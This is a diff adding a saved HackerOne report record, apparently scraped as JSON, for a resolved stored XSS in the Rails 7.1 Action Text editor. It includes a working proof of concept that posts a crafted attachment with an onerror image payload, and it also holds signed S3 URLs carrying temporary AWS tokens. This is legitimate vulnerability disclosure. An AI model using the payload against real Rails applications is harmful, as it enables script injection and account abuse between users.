@@ -1,0 +1,205 @@
+{
+  "id": 2389565,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzg5NTY1",
+  "url": "https://hackerone.com/reports/2389565",
+  "title": "Action Text XSS (Rails 7.1.x)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2024-02-25T13:50:14.241Z",
+  "submitted_at": "2024-02-25T13:50:14.371Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/f287f761e822d68f6d2a6fdde3cb8c84c04060fd04f19b5dab1fe20f75f44886"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2025-02-04T05:47:29.433Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-01-05T05:47:19.829Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I have confirmed that XSS occurs on the Action Text edit ui.\nXSS is triggered when attempting to edit the text in which the crafted values are stored.\n\n### PoC\n\nPrepare the environment.\n\n```\n❯ rails new -C  -G -T text\n# => Rails 7.1.3.2, Ruby 3.2.3\n\n❯ cd text\n\n❯ bin/rails g scaffold Blog title:string body:rich_text\n\n❯ bin/rails action_text:install\n\n❯ bundle install\n\n❯ bin/rails db:migrate\n\n❯ bin/rails s\n```\n\nOpen `http://localhost:3000/blogs/new`  and send the following from the developer tools\n\n```js\nfunction escapeHTML(str) {\n    var div = document.createElement('div');\n    div.appendChild(document.createTextNode(str));\n    return div.innerHTML;\n}\n\nhtml = \"<img src=. onerror='alert(location)' />\"\nhtml_text = '<action-text-attachment content-type=\"text/html\" content=\"'+ escapeHTML (html) +'\"></action-text-attachment>'\n\ncsrfToken = document.querySelector(\"meta[name='csrf-token']\").content\n\nfetch(\"http://localhost:3000/blogs\", {\n  \"headers\": {\n  \t\"content-type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n    \"x-csrf-token\": csrfToken,\n  },\n  \"body\": \"blog%5Btitle%5D=aaa&blog%5Bbody%5D=\" +encodeURIComponent(html_text)+ \"&commit=Create+Blog\",\n  \"method\": \"POST\",\n});\n```\n\nCan confirm that XSS does not fire on the `http://localhost:3000/blogs/xxx/show` page, \n\n{F3079164}\n\nbut XSS does occur on the `http://localhost:3000/blogs/xxx/edit` page. \n\n{F3079167}\n\n## Impact\n\nIf multiple users have access to the same edit page, an XSS-based attack is possible between users.\n\nThis vulnerability is probably due to https://github.com/rails/rails/pull/45739 PR and was not reproduced in Rails 7.0.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 3079164,
+      "file_name": "7_1_show.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/64g5zdbvr0am9sgy5zrgk2vdtxjo?response-content-disposition=attachment%3B%20filename%3D%227_1_show.png%22%3B%20filename%2A%3DUTF-8%27%277_1_show.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2MOJT4AN%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T043441Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJHMEUCIQD3Qjko6tbjizyJdE0klDA5VJAURtGrnfIoBa0Zb0SvDQIgMKE0ULk0Hq4jsTUmSbEqVZwX6cL91heM7XyCJX2h8IsqsgUIBRADGgwwMTM2MTkyNzQ4NDkiDLiiVIDwkmmpDCBZxCqPBUEp6QGtufdyUiB6GcdmRp6D1wiJfn51kkIaW0JNlMlPklDIWVvhp3vbd2Xz1lCljyE13mOi%2BayGrMtwfu70hXMJB%2BU9m6SgPth%2FE8V%2Fbf586aKgih%2FItM7Ccg%2BbNHwkMz7DfxssSi3%2FJW9k6nQKndhT4xvi%2B5a%2F%2FkQNCwojQX57kRtl9GFWPQ%2BHugT0OhJUedT%2FLp3965hC82MXIOHPGqWkhD4qD50V1IZk0pHdA%2F3bnVJc1DCMCKrmSlVWkQkOsi6dmbOp%2Befnq6cLg3wyOUjK39lVEj4WTFcfhP7oLhZVscjQMSlZtWYz97dm0rAQOYUbzMO2DfXy6C0YoBk5zksqNZAiRjtS3EmiZlpgCKYZl%2FN3egd%2FR8BfnCkwQqXrR7uqFndqhNFbBSxWIYxXS3hDUAHusThLJau9aoRehQX63k1wbiWa6dd25Ev9yxj5WMSoUEwlte3LGHLn4nu0OfC%2F%2F980LLot4%2FGUSrJjVWmeX9DhAKzEXt51g6dfpssffXYGYoRiUu8w6KxPvYtEci3zPkZz4pOIxf%2BxlxOwFsenYVyXDcn%2BxkZXLxU6zAjySuk5RT1cOAk5n7B14KKV48uVyMUPVKUdZ3tVtazEvu9Hik7e7Froia8Mqk8VxzrsPRX8ftSLN%2B2ZkEtnLzyEgyQ83VOQ6B8e093JvBGPsCPsD2FEbUosXS8wIBeQ%2FZ9c1jqdgr%2FB%2F4keEDNfPSEBltngo9kYIbmMZGwXVdPuWYm7QPt2b0zAGxI7j%2BKR0UXra19lArYZ6uPI0c2XldcGUNrdXgq47mra425UedmiuqquQnZuHfqtq4stDToASDinGUMLTRu67Hs7E7Ojn6gUIqRSCn9rlmGsveDgdVOut8Ywht2c0gY6sQEsLT6vQmAICUjWpMBi8VXGYlPxWMJ6lZo5e9c4n6%2FoXQGh%2B4vcMgc1A2J0pQJT4CMpLcATLzm%2BFQcDgK14NK6E4D14M7A5yUrNChNvCOMwqWzVu3VokeUVwQg0zJfSnPC42Q9f5RQ7iI7%2B%2B71mkYtVpuMX1xsHKcyacBxLb7N0ekpwxFleAJV7HRkqU5qS6ILgKdob4cjYiD598PdXl%2FI5uApKbLpCyly7WEbGfTn9KvI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b5f7824ea7aef37208437348c64008fd4c090d1f77c25a21d578523a0046f002",
+      "file_size": 52204,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 3079167,
+      "file_name": "7_1_edit.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/imfcojs8muqje7mg8jeg2gzmpk16?response-content-disposition=attachment%3B%20filename%3D%227_1_edit.png%22%3B%20filename%2A%3DUTF-8%27%277_1_edit.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2MOJT4AN%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T043441Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJHMEUCIQD3Qjko6tbjizyJdE0klDA5VJAURtGrnfIoBa0Zb0SvDQIgMKE0ULk0Hq4jsTUmSbEqVZwX6cL91heM7XyCJX2h8IsqsgUIBRADGgwwMTM2MTkyNzQ4NDkiDLiiVIDwkmmpDCBZxCqPBUEp6QGtufdyUiB6GcdmRp6D1wiJfn51kkIaW0JNlMlPklDIWVvhp3vbd2Xz1lCljyE13mOi%2BayGrMtwfu70hXMJB%2BU9m6SgPth%2FE8V%2Fbf586aKgih%2FItM7Ccg%2BbNHwkMz7DfxssSi3%2FJW9k6nQKndhT4xvi%2B5a%2F%2FkQNCwojQX57kRtl9GFWPQ%2BHugT0OhJUedT%2FLp3965hC82MXIOHPGqWkhD4qD50V1IZk0pHdA%2F3bnVJc1DCMCKrmSlVWkQkOsi6dmbOp%2Befnq6cLg3wyOUjK39lVEj4WTFcfhP7oLhZVscjQMSlZtWYz97dm0rAQOYUbzMO2DfXy6C0YoBk5zksqNZAiRjtS3EmiZlpgCKYZl%2FN3egd%2FR8BfnCkwQqXrR7uqFndqhNFbBSxWIYxXS3hDUAHusThLJau9aoRehQX63k1wbiWa6dd25Ev9yxj5WMSoUEwlte3LGHLn4nu0OfC%2F%2F980LLot4%2FGUSrJjVWmeX9DhAKzEXt51g6dfpssffXYGYoRiUu8w6KxPvYtEci3zPkZz4pOIxf%2BxlxOwFsenYVyXDcn%2BxkZXLxU6zAjySuk5RT1cOAk5n7B14KKV48uVyMUPVKUdZ3tVtazEvu9Hik7e7Froia8Mqk8VxzrsPRX8ftSLN%2B2ZkEtnLzyEgyQ83VOQ6B8e093JvBGPsCPsD2FEbUosXS8wIBeQ%2FZ9c1jqdgr%2FB%2F4keEDNfPSEBltngo9kYIbmMZGwXVdPuWYm7QPt2b0zAGxI7j%2BKR0UXra19lArYZ6uPI0c2XldcGUNrdXgq47mra425UedmiuqquQnZuHfqtq4stDToASDinGUMLTRu67Hs7E7Ojn6gUIqRSCn9rlmGsveDgdVOut8Ywht2c0gY6sQEsLT6vQmAICUjWpMBi8VXGYlPxWMJ6lZo5e9c4n6%2FoXQGh%2B4vcMgc1A2J0pQJT4CMpLcATLzm%2BFQcDgK14NK6E4D14M7A5yUrNChNvCOMwqWzVu3VokeUVwQg0zJfSnPC42Q9f5RQ7iI7%2B%2B71mkYtVpuMX1xsHKcyacBxLb7N0ekpwxFleAJV7HRkqU5qS6ILgKdob4cjYiD598PdXl%2FI5uApKbLpCyly7WEbGfTn9KvI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1ac803f130675b50d850f38347331bd8f663075cec9e027efef7bbdcb16806fa",
+      "file_size": 148749,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2025-02-04T05:47:20.019Z",
+  "allow_singular_disclosure_after": -44405241.13118422,
+  "singular_disclosure_allowed": true,
+  "vote_count": 33,
+  "voters": [
+    "g3ksec",
+    "aboalezz",
+    "zy9ard3",
+    "mohaned0101",
+    "thalaivar304",
+    "jmo740",
+    "0xsheet",
+    "2026",
+    "aliyueka",
+    "m_v1337",
+    "and 23 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "2389565",
+  "votes": 33,
+  "latest_disclosable_activity_at": "2025-02-04T05:47:29.868Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T12:34:41.267085",
+    "source": "https://hackerone.com/reports/2389565.json",
+    "report_id": 2389565
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzg5NTY1",
+    "databaseId": "2389565",
+    "title": "Action Text XSS (Rails 7.1.x)",
+    "url": "https://hackerone.com/reports/2389565",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2025-02-04T05:47:29.433Z",
+    "created_at": "2024-02-25T13:50:14.241Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzYy",
+      "name": "Cross-site Scripting (XSS) - Stored",
+      "external_id": "cwe-79"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "ooooooo_q"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIy",
+      "handle": "rails",
+      "name": "Ruby on Rails",
+      "url": "https://hackerone.com/rails",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzIzODk1NjU=",
+    "_id": "2389565",
+    "disclosed": true,
+    "votes": 33,
+    "latest_disclosable_activity_at": "2025-02-04T05:47:29.868Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzg5NTY1",
+      "databaseId": "2389565",
+      "title": "Action Text XSS (Rails 7.1.x)",
+      "url": "https://hackerone.com/reports/2389565",
+      "disclosed_at": "2025-02-04T05:47:29.433Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIy",
+      "handle": "rails",
+      "name": "Ruby on Rails",
+      "url": "https://hackerone.com/rails",
+      "currency": "usd"
+    }
+  }
+}
